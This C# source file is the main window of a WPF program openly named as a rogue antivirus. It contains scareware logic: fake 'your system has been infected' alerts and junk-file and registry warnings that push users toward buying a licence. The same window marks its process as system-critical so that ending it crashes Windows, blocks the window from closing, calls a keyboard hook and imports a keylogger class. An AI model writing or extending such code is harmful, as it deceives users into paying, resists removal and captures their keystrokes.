using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows;
using System.Windows.Controls;
using System.Windows.Data;
using System.Windows.Documents;
using System.Windows.Input;
using System.Windows.Media;
using System.Windows.Media.Imaging;
using System.Windows.Navigation;
using RogueAntivirusPatched.ViewModel;
using RogueAntivirusPatched.View.Pages;
using RogueAntivirusPatched.Classes;
using RogueAntivirusPatched.Model;
using RogueAntivirusPatched.TrialMode;
using RogueAntivirusPatched.Advertisement;
using RogueAntivirusPatched.Global;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Threading;
using System.Reflection;
using RogueAntivirusPatched.View.Windows;
using static RogueAntivirusPatched.View.Windows.AnnoyingPopUp;
using static RogueAntivirusPatched.Windows.Popup;
using static RogueAntivirusPatched.Global.Variables;
using System.IO;
using static RogueAntivirusPatched.Classes.Keylogger;
using RogueAntivirusPatched.Windows;
using System.Windows.Threading;
using static Ntdll.ntdllMain;

namespace RogueAntivirusPatched
{
    /// <summary>
    /// Interaction logic for MainWindow.xaml
    /// </summary>
    public partial class MainWindow : Window
    {
        private vmMainWindow _vmMainWindow;
        private KeySender keySender;
        private RandomAd randomAd;
        private CountDown trialTimer;
        private System.Timers.Timer checkIfSafe;
        private AboutSecurity aboutSecurity;
        private UniversalPublisher universalPublisher;
        private Popup popup;
        private TrayIcon trayIcon;
        private SystemShutdown systemShutdown;
        private static readonly Random rand = new Random();
        public class UniversalArgs : EventArgs
        {
            public enum Types
            {
                Antivirus = 0,
                JunkCleaner = 1,
                Registry = 2
            }

            public Types Type { get; }

            public UniversalArgs(Types type)
            {
                Type = type;
            }
        }

        public class UniversalPublisher
        {
            public event EventHandler<UniversalArgs> popUpHandler;
            public void RaiseMessage(UniversalArgs.Types type)
            {
                popUpHandler?.Invoke(this, new UniversalArgs(type));
            }
        }

        public MainWindow()
        {
            InitializeComponent();
            _vmMainWindow = new vmMainWindow();
            DataContext = _vmMainWindow;

            keySender = new KeySender();
            randomAd = new RandomAd();
            trialTimer = new CountDown();
            aboutSecurity = new AboutSecurity();

            trayIcon = new TrayIcon();
            trayIcon.Initialize();

            checkIfSafe = new System.Timers.Timer();
            checkIfSafe.Interval = 1;
            checkIfSafe.Enabled = true;
            checkIfSafe.Elapsed += CheckIfSafe_Elapsed;

            universalPublisher = new UniversalPublisher();
            universalPublisher.popUpHandler += UniversalPublisher_Handler;

            systemShutdown = new SystemShutdown();
            systemShutdown.SetShutdownEvent();
            systemShutdown.SetAppAsCritical();
        }

        private void CheckIfSafe_Elapsed(object sender, System.Timers.ElapsedEventArgs e)
        {
            SafeRun();
        }

        public vmMainWindow VmMainWindow
        {
            get { return _vmMainWindow; }
        }

        private void Window_Loaded(object sender, RoutedEventArgs e)
        {
            Hook();
            _vmMainWindow.ContentPage = new SystemInfoPage();

            //Has its own logic, leave it like this
            SetActiveStatus();

            AntivirusChecker();
            JunkFilesChecker();
            RegistryChecker();

            _vmMainWindow.AppName = KeySender.fixedsubKeyName;
        }

        private void AntivirusChecker()
        {
            string[] getBaseFiles = Directory.GetFiles(RogueBaseDir);

            foreach (var files in getBaseFiles)
            {
                if (files.Contains("avLocation.txt"))
                {
                    string text = "Watch out!" + Environment.NewLine + "Your system has been infected with malware!"
                        + Environment.NewLine + "Remove threats immediately!";

                    Application.Current.Dispatcher.Invoke(() =>
                    {
                        popup = new Popup();
                        popup.firstButton.PreviewMouseLeftButtonDown += (s, e) => universalPublisher.RaiseMessage(UniversalArgs.Types.Antivirus);

                        popup.ShowPopup("Antivirus", "Threats Found", text, "Redirect",
                            Properties.Resources.warning, PopUpDuration.ANIM_LONG);
                    });

                    break;
                }
            }
        }

        private void RegistryChecker()
        {
            string[] getBaseFiles = Directory.GetFiles(RogueBaseDir);

            foreach (var files in getBaseFiles)
            {
                if (files.Contains("regData"))
                {
                    string text = "It seems that your Registry is still flooded with unused data!"
                        + Environment.NewLine + "Remove all founded data to get higher performance and keep your Registry clean.";

                    Application.Current.Dispatcher.Invoke(() =>
                    {
                        popup = new Popup();
                        popup.firstButton.PreviewMouseLeftButtonDown += (s, e) => universalPublisher.RaiseMessage(UniversalArgs.Types.Registry);

                        popup.ShowPopup("Registry Optimizer", "Unused data", text, "Redirect",
                            Properties.Resources.registry, PopUpDuration.ANIM_LONG);
                    });

                    break;
                }
            }
        }

        private void JunkFilesChecker()
        {
            string[] getBaseFiles = Directory.GetFiles(RogueBaseDir);

            foreach (var files in getBaseFiles)
            {
                if (files.Contains("junk"))
                {
                    string text = "Some junk files are still waiting for disposal." + Environment.NewLine +
                    "You should delete them now until the system will be flooded with garbage data!";
         
                    Application.Current.Dispatcher.Invoke(() =>
                    {
                        popup = new Popup();
                        popup.firstButton.PreviewMouseLeftButtonDown += (s, e) => universalPublisher.RaiseMessage(UniversalArgs.Types.JunkCleaner);

                        popup.ShowPopup("Junk Cleaner", "Disposal is required!", text, "Redirect",
                            Properties.Resources.sweep, PopUpDuration.ANIM_LONG);
                    });

                    break;
                }
            }
        }

        private void UniversalPublisher_Handler(object sender, UniversalArgs e)
        {
            Show();
            Activate();

            if (IsPageWorking)
            {
                Messages.ProcessIsRunning();
                return;
            }

            switch (e.Type)
            {
                case UniversalArgs.Types.Antivirus:
                    _vmMainWindow.ContentPage = new AntivirusPage();
                    break;

                case UniversalArgs.Types.JunkCleaner:
                    _vmMainWindow.ContentPage = new JunkCleanerPage();
                    break;

                case UniversalArgs.Types.Registry:
                    _vmMainWindow.ContentPage = new RegistryPage();
                    break;
            }
        }

        private void SetActiveStatus()
        {
            aboutSecurity.DetermineStatus();
            //Set the upgraded version if license key is corrent, otherwise continue with Trial Mode
            if (!keySender.HasLicense)
            {
                _vmMainWindow.WindowTitle = KeySender.fixedsubKeyName + " | " + mLicenseStuff.notActive + " :(";
                _vmMainWindow.IsVisibleRegisterBtn = Visibility.Visible;

                trialTimer.SetTrialMode();
                trialTimer.LicenseChecker_Main();
                randomAd.SetUpAds();
                trialTimer.DaysLeftCheckerTimer();
                //systemShutdown.SetAppAsCritical();

                return;
            }

            _vmMainWindow.WindowTitle = KeySender.fixedsubKeyName + " | " + mLicenseStuff.licenseActive + " :)";
            _vmMainWindow.IsVisibleRegisterBtn = Visibility.Hidden;
            //systemShutdown.SetAppAsCritical(0);
        }
        private void AntivirusPageClickEvent(object sender, MouseButtonEventArgs e)
        {
            _vmMainWindow.ContentPage = new AntivirusPage();
        }
        private void JunkPageClickEvent(object sender, MouseButtonEventArgs e)
        {
            _vmMainWindow.ContentPage = new JunkCleanerPage();
        }
        private void RegistryPageClickEvent(object sender, MouseButtonEventArgs e)
        {
            _vmMainWindow.ContentPage = new RegistryPage();
        }
        private void SystemInfoPageClickEvent(object sender, MouseButtonEventArgs e)
        {
            _vmMainWindow.ContentPage = new SystemInfoPage();
        }

        private void SupportClickEvent(object sender, MouseButtonEventArgs e)
        {
            Contact.GetToEmail();
        }

        private void Register_Click(object sender, RoutedEventArgs e)
        {
            SafeRun();

            if (!_vmMainWindow.IsSafe)
            {
                Messages.ProcessIsRunning();
                return;
            }

            _vmMainWindow.ContentPage = new RegisterPage();
        }

        private void SafeRun()
        {
            if (Variables.IsPageWorking)
            {
                _vmMainWindow.IsSafe = false;
                return;
            }
            _vmMainWindow.IsSafe = true;
        }

        private void StackPanel_PreviewMouseDown(object sender, MouseButtonEventArgs e)
        {
            SafeRun();

            if (!_vmMainWindow.IsSafe)
            {
                Messages.ProcessIsRunning();
                e.Handled = true;
            }
        }

        private void Window_Closing(object sender, System.ComponentModel.CancelEventArgs e)
        {
            e.Cancel = true;
            Hide();
        }

        private void Hyperlink_RequestNavigate(object sender, RequestNavigateEventArgs e)
        {

        }

        private void Window_Activated(object sender, EventArgs e)
        {
            if (!PayloadsRunning)
                return;
            Hide();
            Close();
        }

        private void MenuItem_MouseDown(object sender, MouseButtonEventArgs e)
        {

        }
    }
}
